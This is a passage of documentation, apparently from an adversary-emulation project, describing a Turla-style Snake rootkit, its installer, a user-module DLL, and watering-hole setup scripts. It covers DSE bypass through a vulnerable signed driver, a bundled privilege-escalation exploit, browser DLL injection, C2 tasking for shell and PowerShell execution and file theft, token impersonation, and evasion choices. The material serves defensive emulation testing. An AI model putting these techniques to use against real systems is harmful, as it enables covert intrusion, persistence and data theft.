Administrative command prompt, enter Bcdedit.exe -set TESTSIGNING ON and reboot your machine. You should now see \"Test Mode\" in the bottom right hand corner of your desktop.","Run the script .\\run_driver.ps1 start in the same directory as your driver, and it will automatically create and start the driver for you. To stop the driver, run .\\run_driver.ps1 stop","If you are running the driver via the installer, test signing mode is not necessary. Please refer to the installer documentation for more information."]},{"l":"Debugging","p":["If you build the driver with the DEBUG_PRINT compiler flag it will output some helpful status messages. You can view this output using DebugView or WinDbg while installing and running the driver."]},{"l":"Cleanup","p":["Use the Snake Installer cleanup script to remove the driver and its artifacts. This will require a reboot."]},{"l":"References","p":["https://github.com/Rhydon1337/windows-kernel-dll-injector","https://github.com/JaredWright/WFPStarterKit","https://github.com/everdox/InfinityHook","https://github.com/DarthTon/Blackbone"]},{"l":"CTI","p":["https://www.circl.lu/pub/tr-25/#analysis-payload","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-uroburos-patchguard-bypass"]}],[{"l":"InfinityHook Library","p":["Enables system call hooks, among other things, without disturbing PatchGuard. For more detail, see the original InfinityHook repository on Github. We utilize the libinfinityhook library."]},{"l":"Compatibility","p":["Known functional on Windows 10 v1903 or older. Tested on Build 17763.rs5_release.180914-1434 with test signing ON."]},{"l":"Modifications","p":["Updated VS Project file libinfinityhook.vcxproj to incorporate into SnakeDriver, include Spectre Mitigation, and new Build targets","Wrapped externs in infinityhook.h with #ifdef __cplusplus to improve compatibility","Added SYSTEM_HANDLE_INFORMATION structure definitions to ntint.h","Relocated CkclSessionGuid from ntint.h to infinityhook.cpp"]}],[{"l":"Snake Installer","p":["This component combines several others into a convenient all-in-one executable to setup the Snake rootkit.","These embedded components are:","The privilege escalation exploit CVE-2021-1732","The signed, vulnerable, Gigabyte driver","The unsigned Snake driver (rootkit)","Within the Snake driver, the Snake usermodule","At a high level, the installer takes the following steps:","Elevates privileges, if the force flag is specified.","Creates a directory, specified by the path flag, to house files related to Snake's execution. The default path requires elevated privileges to create.","Drops a vulnerable signed driver and a malcious unsigned driver to path specified in the previous bullet.","Abuses the vulnerable driver to disable Driver Signing Enforcement.","Installs the unsigned driver","The unsigned driver is then responsible for two usermodule injections. One responsible for network communication (user privileges), and one responsible for execution (SYSTEM privileges)","Once the rootkit is running, it will attempt to cleanup by: renabling DSE, and removing the vulnerable Gigabyte driver service and .sys file."]},{"l":"Usage","p":["The drivers are bundled within the installer executable. They will be written in the specified installation directory path. For example, C:\\WINDOWS\\$NtUninstallQ608317$\\gigabit.sys."]},{"l":"Troubleshooting","p":["C:\\Windows\\$NtUninstallQ608317$ is the default snake directory and should contain several files. If the installer was run with the -f(force privilege escalation) flag as a non-admin user, then the presence of this directory indicates that privilege escalation was successful.","C:\\Windows\\msnsvcx64.dll is the usermodule. If present on disk, then the rootkit driver ran far enough to drop the file there.","dbsvcng64.bin is the user-module DLL log file for command execution (process creation, exit codes, command output)","Files on disk","gigabit.sys is the default vulnerable driver file. This file should not be present after the installer finishes.","gusb.sys is the default rootkit driver file.","Incomplete output via C2","Injected DLL","No callback but log files are present","Output but no callback","Services","svcmon32.sdb is the user-module DLL log file for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin is the user-module DLL log file for pipe server logging (when the user module is running in pipe server / c2-comms mode)","The following components can be used to identify how far execution got before failure:","The gusb service should be running","The installer can occasionally fail under certain conditions. Read ahead for information required to diagnose an issue, or skip to the subheading matching your issue for remediation steps.","The system crashes","The taskhostw process running as SYSTEM should have the usermodule dll loaded at all times after a successful installer run","The temporary gigabit service should no longer be present once the installer finishes","There are several target processes ( msedge) that will have the usermodule injected if they are detected communicating over HTTP/S","udmon32.bin is the user-module DLL log file for pipe client logging (when the user module is running in pipe client / execution mode)"]},{"l":"General cleanup steps","p":["For a thorough cleanup, we recommend referencing the cleanup section in the Snake overall README file.","However, if you want to manually run certain cleanup portions, you can reference the below instructions.","From an adminstrative prompt the following commands can be used to setup a second attempt.","If the usermodule DLL is resident within taskhostw the computer will need to be rebooted so that handle to the DLL will be released.","If the usermodule DLL is resident within msedge all Edge processes will need to be closed.","Delete the usermodule from disk and cleanup will be complete."]},{"l":"Incomplete output via C2","p":["If stdout does not log Installation complete, identify whether or not the usermodule DLL was written to C:\\Windows\\msnsvcx64.dll.","If the file was not written to disk, the installer did not run the rootkit service","Simply follow the cleanup steps from an admin command prompt and try again","If the file was written to disk, the rootkit is running","Check the home directory for vulnerable gigabit.sys driver, if it isn't there it should be safe to proceed.","Ohterwise, follow the cleanup steps from an admin prompt"]},{"l":"Output but no callback","p":["If the installer completes the output should end with:","Installation complete","When the installer runs successfully, we need to see how far the driver made it through injection of the two usermode DLLs. Examine the installer home directory for the presence of the usermodule's encrypted log files.","If svcmon32.sdb or svcstat64.bin are missing, then the user-module DLL may not have successfully been injected into the target browser process (in our emulation, Microsoft Edge).","Simply generate some traffic from the browser to ensure injection is triggered (e.g. open a new tab and browse to a site)","Close all edge processes and try again (this doesn't require administrator rights)","If udmon32.bin or dbsvcng64.bin are missing, then the execution instance of the usermodule DLL may not have successfully been injected into taskhostw.","As an administrator, enumerate the DLLs loaded into the instance of taskhostw owned by the SYSTEM user","If it's not present, follow the cleanup instructions and try again"]},{"l":"No callback but log files are present","p":["There may be an issue with named pipe communication between usermodule instances. This requires pulling the encrypted logs off the host, decrypting and analyzing them for issues. For specific instructions, please see the user-module troubleshooting guide."]},{"l":"The system crashes","p":["Retrieve the dump files for further analysis","C:\\Windows\\MEMORY.DMP","C:\\Windows\\minidump\\DUMP_CREATED_AT_TIME_OF_CRASH.dmp","When possible, loading the associated PDB file while debugging is advised."]},{"l":"Build"},{"l":"Requirements","p":["vcpkg","CMake 3.23","C++23(for std::expected)","vcpkg is used to manage third party libraries. Once installed, make sure to set the VCPKG_ROOT envrionment variable as it will be used during the build process."]},{"l":"Vulnerable Driver","p":["The Snake Installer makes use of a vulnerable Gigabyte driver to disable Driver Signing Enforcement. To make use of this repository, said driver needs to be downloaded, XOR'd with the key 0xd3, and placed at the path: data/gdrv.sys.xor. Once that dependency has been satisfied the subsequent build commands can be followed."]},{"l":"Compilation"},{"l":"Visual Studio","p":["Clone the turla repo within the IDE or open the existing local repository","Project -> CMake Workspace Settings","Edit the CMake workspace settings to contain the following:","The installer can now be built and debugged using Visual Studio's native CMake integration."]},{"l":"Command Line","p":["The binary will be output into build/x64-debug/src/installer.exe"]},{"l":"Cleanup","p":["To undo changes to the system after running the installer use the included script cleanup.ps1. If the usermodule has been injected into taskhostw, the system may require a reboot prior to cleanup."]},{"l":"Disabling DSE","p":["Driver Signature Enforcement (DSE) prevents unsigned drivers from interacting with the Windows kernel. However using a vulnerable driver, which is signed, we can disable DSE temporarily before loading our malicious driver."]},{"i":"vulnerable-driver-1","l":"Vulnerable Driver","p":["We are currently using the Gigabyte gdrv.sys which has a known kernel read/write vulnerability. This can be swapped out for any driver with the ability to write to kernel space."]},{"i":"cig_cioptions","l":"CI!g_ciOptions","p":["Driver Signing Enforcement is managed by the Code Integrity kernel module of Windows. It manages the variable, g_ciOptions, which contains the current driver verifications mode. It can either be set to only allow any drivers, only signed drivers or test signed drivers.","Mode","Value","Off","0x0","On","0x6","Test Signing","0xe"]},{"l":"Leak","p":["In order to overwrite CI!g_ciOptions from user-mode we need to first leak it's kernel address. This is possible by retrieving the base address of CI.dll in kernel space, and then calculating the offset to g_ciOptions.","Use the undocumented feature of NtQuerySystemInformation to leak the base address of all currently running kernel modules","Parse the preffered base address of C:\\Windows\\System32\\ci.dll from its PE headers","Map C:\\Windows\\System32\\ci.dll into a memory section and calculate the offset to the export CiInitialize","Do a binary scan of the assembly within CiInitialize searching for a call to the function CipInitialize","Binary scan again from CipInitialize onwards to find a reference to g_ciOptions","This offset may change between Windows versions, but is easy to find using a disassembler and Microsoft's provided symbol server."]},{"l":"References","p":["https://github.com/hfiref0x/KDU","https://v1k1ngfr.github.io/loading-windows-unsigned-driver/","https://seclists.org/fulldisclosure/2018/Dec/39","https://github.com/KaLendsi/CVE-2021-1732-Exploit","https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1732.html"]},{"l":"CTI","p":["https://www.circl.lu/pub/tr-25/#analysis-payload","https://www.virusbulletin.com/virusbulletin/2014/05/anatomy-turla-exploits/","https://artemonsecurity.com/snake_whitepaper.pdf"]}],[{"l":"Snake User Module DLL"},{"l":"Overview","p":["The Snake user module DLL is injected into various userland processes by the rookit via LoadLibrary. Once injected, the user module will either communicate with the C2 server or execute tasks, depending on its mode of operation. The mode of operation is determined by what process the module is injected into - if injected into a browser process, the module will run in C2 communication mode. Otherwise, it will run in task execution mode.","The DLL runs via its DllMain function and branches off into either C2 communication mode or task execution mode, depending on the name of the injected process. The following process names will trigger C2 communication mode:","chrome.exe","firefox.exe","msedge.exe","iexplore.exe","All other process names will trigger task execution mode.","For full functionality, the module must be injected into a browser process and non-browser process. This will allow communication with the C2 server as well as actual command execution. The two module modes communicate with each other via named pipes. Specifically, the C2 communication module listens on \\\\.\\pipe\\commsecdev for beacon requests and task output from the task execution module, and the task execution module listens on \\\\.\\pipe\\commctrldev for instructions passed on by the C2 communication module.","The task execution module will periodically send beacon requests to the C2 communications module, which will forward the requests to the C2 server and send back the instruction response. If the instruction is to download or upload files, the C2 communications module will handle that directly without intervention from the task execution module. If the instruction is to execute a process or command, the execution module will run the task and send the output to the C2 communications module to forward to the C2 server.","Turla has used a similar user module DLL architecture in the past where they broke functionality apart into a pipe server and pipe client module, where the pipe server would handle communications with the C2 server and the pipe client would handle other tasks like command execution 1."]},{"l":"C2 Communications","p":["The user module communicates with a hardcoded C2 server and port value via HTTP GET/POST requests. To determine whether or not the server is online, the module will perform a heartbeat check by requesting the /PUB/home.html file. The server must respond with 1 to indicate that it is online.","Turla has used heartbeat URLs like /D/pub.txt and /IMAGE/pub.html 1","After successful heartbeat verification, the module will perform GET requests on /PUB/{implant_id}(e.g. GET /PUB/123456 to perform beacons and receive instructions. Some instructions may require the implant to run processes or execute shell commands, and the output will uploaded to the C2 server via POST requests to /IMAGES/3/{instruction_id}(e.g. POST /IMAGES/3/123456789012345678 to upload the command output for instruction 123456789012345678).","Note that while Turla has uploaded collected log files to its C2 server by sending POST requests to URLs like /IMAGE/2/{random numbers} 1, we opted to have the implant automatically send the output to the server to improve operator usability (i.e. not having to manually request command output each time a command is run).","When instructed to download a payload, the module will send a GET request to /IMAGES/3/{instruction ID}, using the instruction ID for the associated instruction. If the instruction ID matches a tasked instruction on the server side, the payload will be delivered, and the module will save it on disk at the specified location.","When instructed to upload an arbitrary file, the module will send a POST request to /IMAGES/3/{instruction ID}, using the instruction ID for the associated instruction. If the instruction ID matches a tasked instruction for non-command-output file uploads on the server side, the C2 server will accept the upload and save it server-side. Note that the endpoint is the same as for command output uploads - the C2 server distinguishes upload types based on the instruction ID used in the URL.","The implant can also be instructed to upload its log files via POST requests 1 to /IMAGES/3/{log file ID}, where the log file IDs are hardcoded ID strings for each log type:","62810421015953103444 for C2 logs","23329841273669992682 for execution logs","59463656487865612747 for pipe server (C2 communications module) logs","16488587954892310865 for pipe client (task execution module) logs","The implant will delete the log files after upload to clear them out 1."]},{"l":"Implant ID","p":["Prior to beginning C2 communications, the comms module mode will look up the local victim's computer name and use the first 10 characters as an XOR key against the default key value of 2157108421. If the computer name is less than 10 characters, it is repeated as an XOR key. The XORed value is then converted to hex to represent the implant ID. If the implant fails to retrieve the computer name for whatever reason, it uses the default key value 2157108421 as the implant ID."]},{"l":"User Agent","p":["Turla has used the user agent string Mozilla/4.0 (compatible; MSIE 6.0) in the past for Snake 1. However, to improve defense evasion purposes, we opted for setting a commonly used user agent based on the browser process that the user module is injected into:","For chrome.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","For firefox.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0","For iexplore.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko","For msedge.exe, the user module will use Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/106.0.1370.52"]},{"l":"Tasks","p":["00- \"empty\" instruction. Don't do anything other than sleep before the next beacon.","01- shell command instruction to execute via cmd.exe /c. There will be a single instruction argument, which is a base64-encoded command that the implant will decode and execute. The command output will be sent to the C2 server afterwards.","02- base64-encoded powershell instruction to execute via powershell.exe -nol -noni -nop -enc .... There will be a single instruction argument, which is the base64-encoded command to run. The output will be sent to the C2 server afterwards. Note that we recommend prepending your powershell commands with $ProgressPreference=SilentlyContinue; to avoid the CLIXML stderr.","03- instuction to spawn a process using the specified binary path and optional args. The optional args are base64-encoded, which the implant will decode and execute. The command output will be sent to the C2 server afterwards.","04- instruction to download a file. There will be two arguments - the first one if the filename that is being requested from the C2 server (currently only used for logging purposes), and the second is the location to save the payload on disk. If only a filename is provided as the destination, the payload will be saved in the Snake home directory rather than the current directory (current directory is specified with an explicit .\\).","05- instruction to upload an arbitrary file. There will be one argument - the path to the file on the local system to upload to the C2 server.","06- instruction to upload log files. No arguments needed, since the implant has the log file paths and IDs hardcoded.","A payload instruction may look like the following:","An empty instruction may look like this (type code 00, sleep for 15 seconds):","Each instruction, including empty instructions, is defined by an 18-digit random ID, and is categorized among various instruction types based on a 2-digit type code. The type code determines how to interpret the instruction arguments.","Example:","In the above example, the ID is 402350900690432407, the type code is 01, the command to execute is whoami /all as the user mydomain\\myuser, and the implant will sleep for 20 seconds afterwards.","In the above example, the module will request file malware.exe from the C2 server and save it as benign.exe in the Snake home directory.","Instructions also come with various options:","Note that the available CTI does not dive into much detail in terms of the task format, especially for different instruction types. CTI shows a similar task format but for a different type of instruction (changing C2s rather than executing a shell command). 1","Sleep time, or how many seconds to sleep after performing the instruction and before sending the next beacon.","Task output is automatically sent to the C2 server for operator ease of use.","The following type codes are supported:","The implant receives tasking from the C2 server as part of a successful beacon response. If no task is specified, the implant receives a \"blank\" instruction that simply tells it to sleep for a random number of seconds, within a specified interval (currently between 10 and 20 seconds).","The overall received instruction blob uses the following format:","Username for a user to run a process as, if available."]},{"l":"Running Tasks As Another User","p":["The user module has the capability to run tasks as another user. For instance, while the execution mode typically runs in a SYSTEM process, it can be instructed to start a process as a domain user or domain admin. The module will do this if the received instruction contains a username to run the command as, in domainname\\username format. The module will then do the following:","Take a snapshot of all the current processes on the local system","Search through the processes until it finds a process belonging to the target user","If the process has an elevated token, the module will duplicate the process token and use it to spawn the child process","If the process belonging to the target user is not elevated, continue searching","If all processes are searched and only a non-elevated process was found for the target user, the module will duplicate that token and use it to spawn the child process","If all processes are exhausted and no processes are found belonging to the target user, the module will run the command under its current context","Some Turla samples have access token manipulation capabilities, such as indications of the DuplicateTokenEx and OpenProcessToken functions 3."]},{"l":"Encryption"},{"l":"C2","p":["Turla has used XOR-encryption for communication, such as for tasking and for log files. 1","We use a different XOR key from what Turla uses:","The user module uses XOR encryption in the following cases:","decrypting beacon responses from the C2 server","encrypting command output when sending it to the C2 server","encrypting log messages","encrypting non-log file uploads to the C2 server (logs are already encrypted)","decrypting payload downloads from the C2 server"]},{"l":"Named Pipes","p":["Turla has used CAST-128 encryption for peer-to-peer named pipe communication in other implants. 2","To keep a similar approach, the emulated implant uses CAST-128 encryption for named pipe communication between the execution and comms module modes.","The 128-bit key used is c7daecf7df559a1a6eb1da73617d82c1, which is derived from 5 iterations of PBKDF2-SHA1, with a passphrase of checkmateNASA and salt value of saltandpepper. The passphrase and salt value are hardcoded in the implant, and the key is derived when the implant starts."]},{"l":"Logging","p":["The user module will log various debug, info, and error messages throughout its execution. Various log files are used to split up the different logging categories:","svcmon32.sdb for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin for pipe server logging (when in pipe server mode)","udmon32.bin for pipe client logging (when in pipe client / execution mode)","dbsvcng64.bin for logging related to command execution (process creation, exit codes, command output)","The log files are located in the Snake home directory. Each log message is XOR-encrypted and base-64 encoded prior to being appended to the corresponding log file as a new line. The plaintext format is as follows:","Example:","Note that timestamps are in UTC."]},{"l":"File Mutexes","p":["Since the communication and execution modes both touch the execution and pipe client log files, the Snake user module creates a global mutex for each file:","Global\\WindowsCommCtrlDB for the pipe client log","Global\\WinBaseSvcDBLock for the execution log","The different usermodule modes will use the mutexes to coordinate synchronized file access for the commonly used log files.","Turla has used mutexes in the past, for instance in their Carbon DLL implant. 2"]},{"l":"Troubleshooting","p":["./evalsC2client.py --set-task guid '{type: 6}'","dbsvcng64.bin for logging related to command execution (process creation, exit codes, command output)","Each log file covers different aspects of the implant:","If the Snake installer is successful but you don't receive a beacon, there are two main possible points of failure:","If you do not have a beacon, you will have to manually copy the files from the Windows target host to your linux C2 server, where you can call the control_server/handlers/snake/decrypt_logs.py utility like so:","If you have successful beacons and are troubleshooting other issues, you can task the implant to upload the logs to the C2 server, which will automatically decrypt them and write them to the control_server/files directory:","Note that error codes in the logs will either be a Windows system error code or a custom error code defined in include/usermodule_errors.h","python3 decrypt_logs.py -p /path/to/log -o /path/to/output/file","svcmon32.sdb for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin for pipe server logging (when in pipe server mode)","The C2-related log ( svcmon32.sdb) is used exclusively by the browser-injected DLL process. If the file exists, then the injected DLL was at least able to get far enough to begin logging. If the file exists but is not being updated, then either the DLL crashed or is stuck waiting for the taskhostw-injected DLL to connect to it via named pipes.","The driver was unable to inject successfully into msedge.exe, or the injected DLL crashed","The driver was unable to inject successfully into taskhostw.exe or the injected DLL crashed","The execution log ( dbsvcng64.bin) is used exclusively by the taskhostw-injected DLL and has at least one line written to it when the injected DLL starts up. If the file exists, then the injected DLL was at least able to get far enough to begin logging.","There are two ways to decrypt and read the log files:","To investigate execution-related issues (e.g. failed token impersonation), look at the execution log.","To investigate general C2 communication issues, look at the C2 logs and pipe-related logging.","udmon32.bin for pipe client logging (when in pipe client / execution mode)","You can generally tell which injected DLLs started up by looking for the log files and checking their timestamps:"]},{"l":"Build Instructions","p":["The module requires the Crypto++ library to be built and linked at compile-time. The library was installed on 64-bit Windows using msys2 and mingw64 using the following steps","choco install msys2","Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.","Run msys2 and within the new prompt, run the following:","Either through the UI or through Powershell, set the user environment variable for MINGW64_ROOT so that the value is the directory where mingw64 was installed via msys2 above:","For example: [System.Environment]::SetEnvironmentVariable('MINGW64_ROOT','C:\\tools\\msys64\\mingw64', 'User')","Reopen any command prompts or terminal windows.","Build the usermodule DLL using the following build command in Powershell from the Resources\\Snake\\UserModule directory. If you want to adjust certain preprocessor directives for the C2 address, C2 port, and home directory, you can do so in the compilation command:","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin/usermodule.dll- you should see an empty symbols table."]},{"l":"Unit Tests","p":["(OPTIONAL) If running CMake via Visual Studio Code:","Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.","C:\\Program Files\\CMake\\bin or equivalent CMake bin folder","C:\\tools\\msys64\\mingw64\\bin or equivalent Mingw-w64 bin folder","C/C++","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","choco install msys2","CMake","CMake Tools","CMake: CMake Path","CMake: Generator","Configure CMake settings in VS Code:","Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).","If cmake was already installed but is not in your path, add it to your path manually (e.g. C:\\Program Files\\CMake\\bin)","In Command Palette, run CMake: Run Tests","Make sure CMake is installed on your machine","Make sure mingw64 is installed on your machine. In this particular example, msys2 was installed and used to install mingw64.","Make sure you have the following VS Code extensions:","Open the UserModule project folder in VS Code","pacman -S --needed base-devel mingw-w64-x86_64-toolchain","pacman -Syu","Paths to folders containing gcc and g++ compilers if not already included in the above Mingw-w64 path folder.","Reopen console windows to register the new env variables.","Run msys2 and within the new prompt, run the following:","Set to \"MinGW Makefiles\" (no quotes)","Set to wherever the cmake executable is located","Set up and run tests via Powershell from the UserModule directory:","Unit tests were run on a Windows machine using CMake. Each component subfolder has its own unit test setup.","You will need to restart the shell to use cmake."]},{"l":"CTI References","p":["https://artemonsecurity.com/snake_whitepaper.pdf","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.circl.lu/pub/tr-25/"]}],[{"l":"Turla Setup Procedure","p":["Emulation Team Infrastructure Configuration","Linux Attack Platform Setup","Move Unzipped Binaries into Payloads","Download Required Binary Files"]},{"l":"Emulation Team Infrastructure Configuration","p":["See Getting Started for information on setting up the overall range."]},{"l":"Linux Attack Platform Setup","p":["See Setup RedTeam for information on setting up the attack platform."]},{"l":"Move Unzipped Binaries into Payloads","p":["A zip of the scenario binaries have been included here. The binaries.zip can be unzipped to the expected directory location using the following command and password malware:","â Snake has not been included in this binaries.zip. Please visit the following resources for building Snake and its components:","Snake Installer Build","Snake Build Script"]},{"l":"Download Required Binary Files","p":["Download and extract the PSTools directory","Copy PSExec.exe to the Resources/payloads/carbon directory","Copy PSExec.exe to the Resources/payloads/snake directory","Download pscp.exe and copy it to the Resources/payloads/carbon directory","Download plink.exe and copy it to the Resources/payloads/carbon directory","Download mimikatz","Update the Mimikatz source code with the PTH adjustments then recompile","Copy mimikatz.exe to the Resources/payloads/carbon and Resources/payloads/snake directory","The Resources/payloads directory should be setup to match the following:","As part of infrastructure setup, EPICDropper_http.exe and EPICDropper_https.exe should be staged on a Wordpress server and renamed to NTFVersion.exe and NFVersion_5e.exe, respectively."]}],[{"l":"Watering Hole","p":["Overview","Expected Usage","Package / OS Requirements","Preflight Checks","Usage Examples","Fingerprinting Details from BEEF (via Evercookie and other bundled tools)","Browser-specific Details","Browser-specific Capabilities","Hardware Details","Location Information","Cleanup Instructions","Credential Details","References","CTI Evidence","Wordpress and Apache"]},{"l":"Overview","p":["\"counter\"","Cleanup","cleanup shell script; deletes all site data & database info; kills any processes anticipated to be running","Component","Description","Fingerprinting","Flash Prep","in-range.html","IP Range","python script to append a js redirection script to an html/php file","python script to install and explain setup of fingerprinting capabilities, including the in-range and out-of-range script files","python script to install iframe prompt for target and handler code within WordPress that toggles visibility based on cookie presence","python script to prepend a php comparison to an html/php file","Redirection","script tag in html file that will load hook.js, applied to IP addresses designated by IP Range python script","Setup","shell script to install and initialize a generic wordpress site","surreptitiously named redirection js file - REQUIRES CONFIG","The watering hole setup scripts are made to streamline the already streamlined process of spinning up a wordpress server and then altering it to mimic either a \"compromised\" site or a malicious site. It has the following components:"]},{"l":"Expected Usage","p":["On the Kali C2 server (where the victim will be redirected to):","On the external benign web server (where the victim will browse to, but will be infected with a watering hole):","The setup and cleanup scripts are what they say on the tin: they will setup or teardown a wordpress site with default and wildly insecure credentials. This is all they do, to allow a user to further set up a watering hole attack as they see fit.","The prep and cleanup scripts are expected to be run at superuser privileges; these scripts create and drop databases in SQL, create public directories, and restart system services. Wordpress does not like being run at superuser privileges, so sudo is frequently used to deescalate to user-level commands during the wordpress install proper.","The redirection script is intended to mimic the result of a site compromised by an injection attack - it appends a JS redirection script that points to a remote file (presumably counter.js) to be the src of a script tag. In conjunction, counter.js is expected to be placed on an infection proxy. When executing, write the redirection script to point to counter on the infection proxy host. You must also edit counter.js when placing it on the infection proxy to redirect the user to where you will be checking their IP addresses - presumed to be the infection proxy host itself.","The fingerprinting script installs the BEEF framework, reviews necessary config changes, and prepares user to run beef on local machine in anticipation of victim visit.","The beef setup script confirms that the user has changed BEEF's default credentials and reminds them to alter the appropriate IP information in their IP range script.","The ip range script creates a string of php code and places it in a php file on a separate wordpress site - the one that the client will be redirected to. It will determine if the client is in the range of IP addresses that are of further interest.","The flash prep script copies a string of iframe HTML to a file of your choosing, presumably the index page of your malicious website, and copies a dropper file to the root of your web server that will be downloaded when a user clicks the link inside the iframe.","Both shell scripts are run without argument.","ip_range.py, redirection.py and flash_prep.py scripts expect arguments. All python scripts accept the --help flag."]},{"i":"package--os-requirements","l":"Package / OS Requirements","p":["These scripts were developed on, and are expected to be run on, a Kali Linux box, which is a Debian-based distribution. Service/system calls and package manager examples may differ between distributions.","These scripts expect default Kali installations of Apache web server and SQL(MariaDB). If you don't have them or they've been pruned from your Kali install, get them back with","An apache config file for the wordpress site should be included in the directory. Regardless, links below will be provided if one needs to be made from scratch.","Conversely, the wordpress install should create a wordpress config file for you, but this command expects a running SQL service.","If you are on a system without SQL, instead uncomment the portion of the script that copies the config file to the wordpress directory, and comment out the SQL and wp config portions of the script. These places are commented appropriately.","If you are on a system with a SQL installation similar to Kali, the script will handle the creation of this config file for you."]},{"l":"Preflight Checks","p":["Preflight for a setup script? Yes, just please make sure that you've got everything operational. Get on to the box that you're installing things on:","Make sure that you've got apache and mysql running.","Make sure that you've got sudo privileges","Once you've installed beef via fingerprinting.py, check that you've changed the default credentials"]},{"l":"Usage Examples","p":["Note that expected usage is that the redirection and the ip range / fingerprinting scripts are to be run on different servers."]},{"i":"fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools","l":"Fingerprinting Details from BEEF (via Evercookie and other bundled tools)","p":["Not all the information here is available on every machine. Some information will be listed as \"Unknown\", some information will simply be blank. This represents the information available to the developer when BEEF & evercookie was tested. This list is provided in case third parties ask about the specificity of detail that the fingerprinting tool provides, as opposed to the information specifically sought by the adversary when identifying the victim."]},{"l":"Browser-specific Details","p":["Browser Engine (e.g. Gecko)","Reported Name (e.g. Mozilla/5.0)","Platform (e.g. Linux x86_64)","Plugins (As opposed to \"capabilities\" below, this includes PDF viewer information)","Cookies","Hostname & Port","Referrer","Windows Height & Width","URI"]},{"l":"Browser-specific Capabilities","p":["ActiveX","Flash","Google Gears","PhoneGap / Apache Cordova","QuickTime","RealPlayer","Silverlight","VB Script","VLC","WebGL","WebRTC","WebSocket","WMP"]},{"l":"Hardware Details","p":["Battery Level","Architecture (e.g. x86_64)","CPU Cores","GPU Details / Driver (e.g. using llvm_pipe instead of dedicated GPU)","Memory","Screen Color Depth","Screen Height & Width","Is the screen touch-enabled?","OS Architecture","OS Family & Name","OS Version"]},{"l":"Location Information","p":["City","Country","IP Address"]},{"l":"Cleanup Instructions","p":["Cleanup script will drop wordpress database and user, delete wordpress files, and deactivate the wordpress apache config file.","If for any reason you need to separately stop, pause, or restart the BEEF process but you cannot remember the PID, list all ruby processes then investigate each one:"]},{"l":"Credential Details","p":["For the SQL (MariaDB) installation, the script creates (and the config file expects) the following default credentials:","For the wordpress administration, the script creates (and wordpress expects) the following default credentials:","For the beef installation, the installation has the following default credentials that must be changed in */beef-master/config.yaml"]},{"l":"References"},{"l":"CTI Evidence","p":["https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf"]},{"l":"Wordpress and Apache","p":["Wordpress reference: https://developer.wordpress.org/cli/commands/","Apache configuration reference: https://httpd.apache.org/docs/current/configuring.html","Create new Apache configuration: https://ubuntu.com/tutorials/install-and-configure-apache"]}],[{"l":"R5 Infrastructure Project"},{"l":"Evals Round 5"},{"l":"Requirements","p":["Name","Version","terraform",">=1.1.0","azurerm","<=3.43"]},{"l":"Providers","p":["Name","Version","azurerm","3.43.0","random","3.5.1"]},{"l":"Modules","p":["../modules/linuxsrv-latest-static","../modules/rgroup","../modules/windesk-latest-static","../modules/winsrv-latest-static","boltnet-redirect-srv1","boltnet-redirect-srv2","boltnet-redirect-srv3","carbon-ad-srv1","carbon-desk1","carbon-desk2","carbon-desk3","carbon-ex-srv1","carbon-web-srv1","n/a","Name","red-kali1","rgroup","snake-ad-srv1","snake-desk1","snake-desk2","snake-ex-srv1","snake-file-srv1","Source","support-dns-srv1","support-jumpbox-srv1","support-pf-srv1","support-web-srv3","Version"]},{"l":"Resources","p":["azurerm_client_config.current","azurerm_public_ip.main","azurerm_subnet.boltnet","azurerm_subnet.carbon_desk","azurerm_subnet.carbon_srv","azurerm_subnet.red","azurerm_subnet.snake_desk_v2","azurerm_subnet.snake_srv_v2","azurerm_subnet.support","azurerm_subnet.vpn","azurerm_subscription.current","azurerm_virtual_network_gateway.main","azurerm_virtual_network_peering.peer1to2","azurerm_virtual_network_peering.peer1to3","azurerm_virtual_network_peering.peer2to1","azurerm_virtual_network_peering.peer2to3","azurerm_virtual_network_peering.peer3to1","azurerm_virtual_network_peering.peer3to2","azurerm_virtual_network.vnet1","azurerm_virtual_network.vnet2","azurerm_virtual_network.vnet3","data 